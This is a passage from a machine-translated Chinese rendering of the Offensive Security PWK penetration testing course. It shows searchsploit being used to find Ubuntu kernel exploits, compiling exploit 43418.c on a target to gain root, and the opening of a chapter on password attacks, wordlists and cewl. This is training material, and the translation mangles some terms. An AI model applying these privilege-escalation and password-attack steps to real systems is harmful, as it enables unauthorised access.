<div style="position:absolute;top:151353;left:229"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 588 - 从我们的 Linux 目标收集内核和架构信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标系统似乎正在运行 Ubuntu 16.04.3 LTS（内核 4.8.0-58-generic）</font></font></nobr></div>
<div style="position:absolute;top:151402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86_64 架构。</font><font style="vertical-align: inherit;">有了这些信息，我们就可以</font><font style="vertical-align: inherit;">在本地 Kali 上</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:151421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统查找与目标版本匹配的内核漏洞。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit linux 内核 ubuntu 16.04</font></font></font></b></nobr></div>
<div style="position:absolute;top:151473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ------ -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:151489;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:151489;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/</font></font></nobr></div>
<div style="position:absolute;top:151506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ------ -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:151524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核（Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04 | 漏洞利用/linux_x86-64/local/</font></font></nobr></div>
<div style="position:absolute;top:151541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核（Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.0 | 漏洞利用/linux_x86/local/422</font></font></nobr></div>
<div style="position:absolute;top:151558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 (Ubuntu 16.04) - 引用计数溢出 | </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/39773.txt</font></font></nobr></div>
<div style="position:absolute;top:151574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4 (Ubuntu 16.04) - 'BPF' 本地权限 | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40759.r</font></font></nobr></div>
<div style="position:absolute;top:151591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | </font><font style="vertical-align: inherit;">漏洞利用/linux_x86-64/local/</font></font></nobr></div>
<div style="position:absolute;top:151608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | </font><font style="vertical-align: inherit;">漏洞利用/linux_x86-64/local/</font></font></nobr></div>
<div style="position:absolute;top:151625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.x (Ubuntu 16.04) - 'double-fdput()' b | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/39772.t</font></font></nobr></div>
<div style="position:absolute;top:151642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40489.t</font></font></nobr></div>
<div style="position:absolute;top:151659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.0 |exploits/linux/local/43418.c</font></font></nobr></div>
<div style="position:absolute;top:151676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ———————————————</font></font></nobr></div>
<div style="position:absolute;top:151695;left:228"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 589 - 使用 searchsploit 为我们的目标查找提权漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后一个exploit（exploits/linux/local/43418.c）好像直接对应内核版本</font></font></nobr></div>
<div style="position:absolute;top:151744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标正在运行。</font><font style="vertical-align: inherit;">我们将尝试通过在</font></font></nobr></div>
<div style="position:absolute;top:151764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:151798;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.4.1 在 Linux 上编译 C/C++ 代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font><font style="vertical-align: inherit;">在 Linux 上</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 547</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来编译我们的漏洞利用程序。</font><font style="vertical-align: inherit;">请记住，在编译代码时，我们必须</font></font></nobr></div>
<div style="position:absolute;top:151852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配我们目标的架构。</font><font style="vertical-align: inherit;">这在目标</font></font></nobr></div>
<div style="position:absolute;top:151871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器没有编译器，我们被迫在我们的攻击中编译漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:151891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器或复制目标操作系统和架构的沙盒环境。</font></font></nobr></div>
<div style="position:absolute;top:151924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们很幸运目标机器有一个可以工作的编译器，但这在</font></font></nobr></div>
<div style="position:absolute;top:151943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">场。</font></font></nobr></div>
<div style="position:absolute;top:151976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们将漏洞利用文件复制到目标并编译它，只传递源代码文件和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></nobr></div>
<div style="position:absolute;top:151995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定输出文件名（利用）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n00b@victim:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc 43418.c -o 漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:152047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n00b@victim:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah 漏洞利用</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:152111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">547 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（海湾合作委员会，2019 年），https://gcc.gnu.org</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:152239;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="129"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 129 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:152272;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:153349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:153349;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:153349;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">570</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 36K</font></font></nobr></div>
<div style="position:absolute;top:152384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 kali kali 28K Jan 27 04:04</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:152404;left:192"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 590 - 使用 gcc 从 Linux 上的本地漏洞利用数据库存档编译漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的目标机器上编译漏洞利用后，我们可以运行它并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查我们的</font></font></nobr></div>
<div style="position:absolute;top:152453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权级别：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:153076;left:237"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 293：通过权限提升漏洞提升 Linux 上的权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:153107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图293显示我们的权限成功从n00b（标准用户）提升到root，</font></font></nobr></div>
<div style="position:absolute;top:153127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 操作系统上的最高权限帐户。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:153164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:153206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们介绍了 Windows 和 Linux 上的权限提升概念</font></font></nobr></div>
<div style="position:absolute;top:153225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统以及不同的体系结构。</font><font style="vertical-align: inherit;">我们涵盖了手动和自动</font></font></nobr></div>
<div style="position:absolute;top:153244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举技术，揭示这些类型的攻击所需的信息。</font><font style="vertical-align: inherit;">此外，我们</font></font></nobr></div>
<div style="position:absolute;top:153263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示了两个操作系统的编译过程，演示了几个特权 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:153427;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="130"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 130 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:153460;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:154537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:154537;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:154537;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">571</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:153556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升级攻击，以及不需要软件漏洞的各种权限升级</font></font></nobr></div>
<div style="position:absolute;top:153575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:154615;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="131"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 131 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:154648;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:155725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:155725;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:155725;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">572</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:154738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:154764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19. 密码攻击</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码是用户帐户和服务身份验证的最基本形式，并且通过扩展，</font></font></nobr></div>
<div style="position:absolute;top:154828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码攻击的目标是发现并使用有效的凭据以访问</font></font></nobr></div>
<div style="position:absolute;top:154847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户或服务。</font></font></nobr></div>
<div style="position:absolute;top:154880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，有几种常见的密码攻击方法。</font><font style="vertical-align: inherit;">我们可以做</font></font></nobr></div>
<div style="position:absolute;top:154899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试</font><font style="vertical-align: inherit;">使用各种</font><i><font style="vertical-align: inherit;">单词表</font></i><font style="vertical-align: inherit;">通过字典攻击</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">548</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猜测密码，</font><font style="vertical-align: inherit;">或者我们可以</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:154919;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">549</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码中的每个可能的字符。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:154981;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，字典攻击优先考虑速度，提供较少的密码覆盖，</font></font></i></nobr></div>
<div style="position:absolute;top:155000;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而蛮力以牺牲速度为代价优先考虑密码覆盖范围。</font><font style="vertical-align: inherit;">两个都</font></font></i></nobr></div>
<div style="position:absolute;top:155019;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术可以在参与期间有效地使用，这取决于我们</font></font></i></nobr></div>
<div style="position:absolute;top:155039;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优先级和时间要求。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，一旦我们获得（通常是特权）对目标的访问权，我们就能够提取</font></font></nobr></div>
<div style="position:absolute;top:155120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">550</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以利用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码破解</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">551</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击，试图获得对</font></font></nobr></div>
<div style="position:absolute;top:155139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">明文密码，或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pass-the-Hash </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">552</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击，它允许我们对 Windows 进行身份验证-</font></font></nobr></div>
<div style="position:absolute;top:155159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于仅使用用户名和哈希的目标。</font></font></nobr></div>
<div style="position:absolute;top:155192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将更详细地讨论这些概念和技术中的每一个</font></font></nobr></div>
<div style="position:absolute;top:155211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示如何在各种攻击场景中利用它们。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:155248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.1 词表</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词表，有时也称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词典文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，只是包含要使用的词的文本文件</font></font></nobr></div>
<div style="position:absolute;top:155309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为用于测试密码的程序的输入。</font><font style="vertical-align: inherit;">精度通常比</font></font></nobr></div>
<div style="position:absolute;top:155328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑字典攻击时的覆盖范围，这意味着创建精益</font></font></nobr></div>
<div style="position:absolute;top:155348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关密码的词表，而不是创建一个庞大的通用词表。</font><font style="vertical-align: inherit;">因为这，</font></font></nobr></div>
<div style="position:absolute;top:155367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多词表都基于一个共同的主题，例如流行文化参考、特定的</font></font></nobr></div>
<div style="position:absolute;top:155386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行业或地理区域，并细化以包含常用密码。</font><font style="vertical-align: inherit;">卡利Linux</font></font></nobr></div>
<div style="position:absolute;top:155406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 /usr/share/wordlists/ 目录中包含许多这样的字典文件等等</font></font></nobr></div>
<div style="position:absolute;top:155425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线托管。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">553</font></font></font></nobr></div>
<div style="position:absolute;top:155458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进行密码攻击时，可能很想简单地使用这些预先构建的列表。</font></font></nobr></div>
<div style="position:absolute;top:155477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，如果我们花时间仔细构建我们的方法，我们的方法会更有效。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:155575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">548 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Dictionary_attack</font></font></font></nobr></div>
<div style="position:absolute;top:155595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">549 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Brute-force_attack</font></font></font></nobr></div>
<div style="position:absolute;top:155615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">550 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cryptographic_hash_function</font></font></font></nobr></div>
<div style="position:absolute;top:155635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">551 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Password_cracking</font></font></font></nobr></div>
<div style="position:absolute;top:155655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">552 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Pass_the_hash</font></font></font></nobr></div>
<div style="position:absolute;top:155675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">553 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(danielmiessler, 2019) https://github.com/danielmiessler/SecLists</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:155803;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="132"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 132 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:155836;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:156913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:156913;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:156913;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">573</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自己的自定义列表。</font><font style="vertical-align: inherit;">在本节中，我们将研究创建有效的工具和方法</font></font></nobr></div>
<div style="position:absolute;top:155951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词表。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:155986;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:155986;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准词表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过添加特定于我们的单词和短语来提高单词列表的有效性</font></font></nobr></div>
<div style="position:absolute;top:156043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标组织。</font></font></nobr></div>
<div style="position:absolute;top:156076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，考虑一家处理纳米技术的公司 MegaCorp One。</font><font style="vertical-align: inherit;">公司</font></font></nobr></div>
<div style="position:absolute;top:156095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站 www.megacorpone.com 列出了公司销售的各种产品，包括</font></font></nobr></div>
<div style="position:absolute;top:156114;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在假设的评估中，我们能够识别出一个低级别的密码</font></font></nobr></div>
<div style="position:absolute;top:156134;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米机器人93</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">假设这可能是这家公司的常用密码格式，我们希望</font></font></nobr></div>
<div style="position:absolute;top:156153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个自定义词表来识别具有类似模式的其他密码，也许使用</font></font></nobr></div>
<div style="position:absolute;top:156172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他产品名称。</font></font></nobr></div>
<div style="position:absolute;top:156205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以浏览网站并手动将常用术语和产品名称添加到我们的</font></font></nobr></div>
<div style="position:absolute;top:156224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自定义词表，或者我们可以使用像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cewl </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">554</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的</font><font style="vertical-align: inherit;">工具</font><font style="vertical-align: inherit;">来为我们做繁重的工作。</font><font style="vertical-align: inherit;">如图所示</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:156244;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-help</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出，这个工具可以通过指定几个选项来配置，但我们将重点介绍几个</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键论点。</font></font></nobr></div>
<div style="position:absolute;top:156296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，以下命令抓取 www.megacorpone.com 网站，定位单词</font></font></nobr></div>
